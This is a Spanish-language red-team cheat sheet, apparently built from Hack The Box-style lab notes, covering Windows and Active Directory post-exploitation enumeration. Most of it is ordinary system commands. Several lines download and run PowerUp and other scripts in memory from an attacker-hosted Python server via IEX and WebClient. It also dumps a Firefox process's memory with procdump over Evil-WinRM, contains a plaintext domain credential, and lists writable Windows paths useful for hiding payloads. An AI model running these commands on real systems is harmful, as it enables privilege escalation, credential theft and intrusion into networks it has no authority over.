# VER DIRECTORIOS OCULTOS EN WINDOWS
```shell
PS C:\> dir -Force
```

# ENUMERACIÓN DE USUARIO ACTUAL

### USUARIO ACTUAL
```shell
whoami
```

### IDENTIFICAMOS NUESTROS PRIVILEGIOS
```shell
whoami /priv
```

### INFORMACIÓN+ DE NUESTRO USUARIO
```shell
net user [USUARIO ACTUAL]
```

# USUARIOS Y GRUPOS

### PROPIEDADES DE USUARIO ESPECIFICO
```shell
Get-ADUser -identity s.smith -properties *
```


### LISTAR INFORMACIÓN USUARIOS.
```shell
net user

Get-ChildItem C:\Users -Force | select Name
```

### NET USER
```shell
net user
```

### TODOS LOS USUARIOS
```shell
whoami /all Get-LocalUser | ft Name,Enabled,LastLogon
```

# INFORMACIÓN DE GRUPOS
### NET GROUP
```shell
net group [NOMBRE DEL GRUPO]
```


### MIS GRUPOS
```shell
whoami /groups
```

### GRUPOS LOCALES
```shell
net localgroup
```


# INFORMACIÓN DOMAIN CONTROLLER
```shell
nltest /DCLIST:DomainName

nltest /DCNAME:DomainName

nltest /DSGETDC:DomainName
```


### INFORMACIÓN SOBRE LA RED
```shell
ipconfig /all

Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address

Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

# FIREWALL
### CONFIGURACIÓN
```shell
netsh advfirewall show currentprofile
```



# SYSTEMA
### POWERUP
```shell
#POWERUP
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1
#AÑADIMOS ESTA LINEA AL FINAL DEL ARCHIVO
Invoke-AllChecks

#SERVIDOR DE PYTHON
❯ sudo python3 -m http.server 80


#NOS DESCARGAMOS EL RECURSO
IEX(New-Object Net.WebClient).downloadString(\"http://10.10.16.7/PowerUp.ps1\")
#SI NO FUNCIONA
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7/PowerUp.ps1')

```

### PSDRIVE
```shell
powershell -c get-psdrive
```

### SYSTEMINFO
```shell
systeminfo
```



# PROCESOS
### COMANDOS
```shell
# VIA COMANDOS
tasklist /v

netstat

net start

sc query

Get-Service

Get-Process
get-process -name AggregatorHost
```


### Get-WinEventData
```shell
❯ wget https://raw.githubusercontent.com/RamblingCookieMonster/PowerShell/refs/heads/master/Get-WinEventData.ps1
❯ sudo python3 -m http.server 80

PS C:\ProgramData> IEX(New-Object Net.WebClient).downloadString("http://10.10.16.5/Get-WinEventData.ps1")
PS C:\ProgramData> Get-WinEvent -FilterHashtable @{Logname='security';id=4688} -MaxEvents 1 | Get-WinEventData | fl *
```


### MEMORIA EN PROCESOS
```shell
❯ wget https://download.sysinternals.com/files/Procdump.zip
❯ unzip Procdump.zip
*Evil-WinRM* PS C:\Windows\Temp\recon> upload procdump.exe
*Evil-WinRM* PS C:\Windows\Temp\recon> ./procdump.exe -ma 6524 firefox.dmp
```


# SERVICIOS
### ENUMERACIÓN DE SERVICIOS
```shell
services

net start

wmic service list brief

tasklist /SVC
```


# RECURSOS COMPARTIDOS
### RECURSOS INTERNOS COMPARTIDOS
```shell
Get-SMBShare
```

### RECURSOS COMPARTIDOS DEL DOMAIN CONTROLLER
```SHELL
PS C:\Users\BTables\Documents> PS C:\Users\BTables\Documents> net use \\dc.fulcrum.local\IPC$ /user:FULCRUM\BTables ++FileServerLogon12345++
PS C:\Users\BTables\Documents> net view \\dc.fulcrum.local\
```


# BUSCAR UN ARCHIVO ESPECIFICO
```shell
cmd /c dir /r /s user.txt
```

# LISTAR CONTIDO EN BASE A UNA CADENA
```shell
PS X:\fulcrum.local> Select-String -Path "X:\fulcrum.local\scripts\*.ps1" -Pattern 923a
```


# RUTAS DE ESCRITURA PREDETERMINADAS
```shell
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys

C:\Windows\System32\spool\drivers\color

C:\Windows\System32\spool\printers

C:\Windows\System32\spool\servers

C:\Windows\tracing

C:\Windows\Temp

C:\Users\Public

C:\Windows\Tasks

C:\Windows\System32\tasks

C:\Windows\SysWOW64\tasks

C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system

C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system

C:\Windows\debug\wia

C:\Windows\registration\crmlog

C:\Windows\System32\com\dmp

C:\Windows\SysWOW64\com\dmp
```


# recursos
https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md